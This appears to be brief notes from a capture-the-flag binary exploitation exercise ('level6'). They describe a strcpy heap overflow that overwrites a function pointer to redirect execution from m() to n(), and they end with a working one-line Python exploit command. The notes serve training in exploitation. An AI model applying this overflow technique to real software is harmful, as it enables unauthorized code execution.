
Vulnerability with srctpy in size fixed buffer (0x40)

=> 2 buffers adjacent in the heap 
=> We can overwrite the address of m() in the heap to the address of n()
=> The offset is 72 bytes + adrress
=> We can read the flag 

-> 72 bytes + 4 bytes for addrress of m()

address of n(): 0x08048454 

./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
